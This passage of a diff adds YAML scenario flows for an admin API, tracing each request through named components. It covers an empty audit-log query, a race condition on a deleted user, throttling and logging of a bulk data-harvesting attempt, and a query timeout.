+        action: Queries audit entries for date range — zero records found
+      - node: AdminAuditLogger
+        action: Records empty audit log access (meta-audit)
+      - node: AdminAuditEntry
+        action: Created with action type view_audit_log, result_count 0, date range
+      - node: gateway/ResponseFormatter
+        action: "Formats response with 200 OK — {data: [], meta: {total: 0, page: 1, limit: 100}}"
+      - node: _actors/Admin
+        action: Receives 200 with empty array — no audit entries in the requested range
+
+  AdminViewsRecentlyDeletedUserTasks:
+    steps:
+      - node: _actors/Admin
+        action: Lists all users and selects a user to view their tasks
+      - node: users/UserLister
+        action: Returns user list including user X who is currently active
+      - node: _actors/Admin
+        action: Sends GET /admin/users/X/tasks moments after the user list was returned
+      - node: gateway/RequestRouter
+        action: Routes request to AdminUserTasksEndpoint
+      - node: AdminUserTasksEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Validates user ID format — valid UUID
+      - node: users/UserReader
+        action: Queries for user X — user was deleted between the list and detail requests (race condition)
+      - node: AdminTargetExistsRule
+        action: User X no longer exists — triggers 404
+      - node: AdminAuditLogger
+        action: Records the race condition access attempt
+      - node: AdminAuditEntry
+        action: Created with action type user_tasks_race_condition, target user ID, and deletion timestamp
+      - node: AdminErrorResponse
+        action: Assembled with 404 Not Found — user no longer exists
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/Admin
+        action: Receives 404 — user was deleted between listing and detail view
+
+  AdminBulkDataHarvestingThrottled:
+    steps:
+      - node: _actors/DataExfiltrator
+        action: Systematically pages through admin user list to harvest all user records
+      - node: _actors/DataExfiltrator
+        action: Sends rapid sequential requests — page 1, page 2, page 3 — with minimal delay
+      - node: gateway/RequestRouter
+        action: Routes each request to users/ListUsersEndpoint
+      - node: users/ListUsersEndpoint
+        action: Receives rapid sequential requests
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role — passes for each request
+      - node: AdminRateLimitRule
+        action: Counts requests in sliding window — threshold exceeded after 30 requests per minute
+      - node: AdminAuditLogger
+        action: Records rapid pagination pattern with session ID and cumulative page count
+      - node: AdminAuditEntry
+        action: Created with action type bulk_data_harvesting, pages accessed, and velocity
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as security event — data harvesting pattern detected
+      - node: AdminErrorResponse
+        action: Assembled with 429 Too Many Requests and Retry-After header
+      - node: gateway/ResponseFormatter
+        action: Formats the rate limit response
+      - node: _actors/DataExfiltrator
+        action: Receives 429 — harvesting throttled, security team alerted
+
+  AdminAllTasksQueryTimeout:
+    steps:
+      - node: _actors/Admin
+        action: Requests all tasks when the tasks table is very large
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAllTasksEndpoint
+      - node: AdminAllTasksEndpoint
+        action: Receives GET /admin/tasks request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: tasks/TaskLister
+        action: Begins querying the large tasks table
+      - node: AdminQueryTimeoutEnforcer
+        action: Monitors query execution against AdminQueryTimeoutConfig task list threshold of 10s
+      - node: AdminQueryTimeoutConfig
+        action: Task list query timeout is 10 seconds
+      - node: AdminQueryTimeoutEnforcer
+        action: Query exceeds 10s — aborts the database query
+      - node: AdminAuditLogger
+        action: Records query timeout with endpoint and query duration
+      - node: AdminAuditEntry
+        action: Created with action type query_timeout, endpoint tasks_list, duration exceeded 10s
+      - node: AdminErrorResponse
+        action: Assembled with 504 Gateway Timeout — query took too long
+      - node: gateway/ResponseFormatter
+        action: Formats the timeout error response
+      - node: _actors/Admin
+        action: Receives 504 Gateway Timeout — may retry with narrower filters
